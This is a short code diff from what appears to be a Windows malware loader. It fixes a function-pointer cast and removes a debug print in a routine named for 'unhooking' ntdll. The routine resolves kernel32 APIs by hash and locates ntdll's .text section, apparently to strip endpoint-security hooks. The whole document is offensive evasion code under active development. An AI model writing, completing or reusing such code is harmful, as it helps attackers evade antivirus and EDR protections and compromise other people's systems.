@@ -15,7 +15,7 @@ BOOL evasion_unhook_ntdll_process_load_apis(void) {
     if (!g_ldr->apis->TerminateProcess)
         g_ldr->apis->TerminateProcess = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_TERMINATEPROCESS);
     if (!g_ldr->apis->CloseHandle)
-        g_ldr->apis->CloseHandle = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
+        g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
 
     return (g_ldr->apis->CreateProcessA && g_ldr->apis->VirtualProtect &&
         g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess && g_ldr->apis->CloseHandle);
@@ -48,7 +48,6 @@ BOOL evasion_unhook_ntdll_process(void) {
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (strcmp((char*)section[i].Name, ".text") == 0) {
-            DBGA(".text matchs\n");
             DWORD textSize = section[i].Misc.VirtualSize;
             PBYTE textAddr = ntdll + section[i].VirtualAddress;
 
